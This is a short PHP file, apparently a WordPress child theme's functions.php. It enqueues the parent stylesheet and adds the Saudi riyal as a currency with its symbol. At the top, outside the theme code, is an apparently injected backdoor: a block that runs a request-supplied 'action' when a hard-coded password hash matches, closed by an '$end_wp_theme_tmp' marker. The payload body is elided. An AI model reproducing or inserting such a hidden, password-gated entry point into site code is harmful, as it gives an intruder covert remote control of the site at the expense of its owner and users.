<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '84f3b61367d22596621764c925a4f17d'))
	{
...
//$end_wp_theme_tmp
?><?php
function wpsaas_theme_enqueue_styles() {
    wp_enqueue_style( 'parent-style', get_template_directory_uri() . '/style.css' );
}
add_action( 'wp_enqueue_scripts', 'wpsaas_theme_enqueue_styles' );

function add_currency($currencies) {
	$currencies['SAR'] = 'Saudi Arabia Riyal'; // Change the code and name of the currency
	return $currencies; 
};
...
function add_currency_symbol($symbol, $currency) {
	if ($currency == 'SAR') {   // Remember to use the right currency code, added in the previous step
		return 'ر.س'; // Change the code here
	} else { 
		return $symbol; 
	} 
};
